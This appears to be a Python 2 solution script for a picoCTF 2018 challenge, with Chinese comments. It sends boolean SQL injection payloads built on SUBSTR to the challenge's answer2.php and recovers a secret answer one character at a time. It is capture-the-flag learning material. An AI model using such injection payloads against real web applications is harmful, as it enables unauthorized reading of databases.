# coding=utf-8
import requests
import sys

reload(sys)
sys.setdefaultencoding('utf-8')

close_answer='41ANDSIXSIXTHS'
true_answer=''

for i in range(0, len(close_answer)):
  #SUBSTR是SQL的子字串語法，第一個參數放字串，第二個參數是從第幾個字元開始，第三個參數是要幾個。注意等於後面要加上單引號讓它變成字元
  payload="1' OR SUBSTR(answer,"+str(i+1)+",1)='"+close_answer[i]+"'--"
  #送POST
  r=requests.post('http://2018shell3.picoctf.com:36052/answer2.php',
    data={
      'answer':payload,
      'debug':'1'
    }
  )
  result=r.content.decode('big5')
  #確認是否正確，裡面print出來是我的習慣，怕它其實沒在跑，而是盪掉了XD
  if result.find('You are so close.')!=-1:
    true_answer+=close_answer[i]
    print(close_answer[i])
  else:
    true_answer+=chr(ord(close_answer[i])+32)
    print(chr(ord(close_answer[i])+32))
print true_answer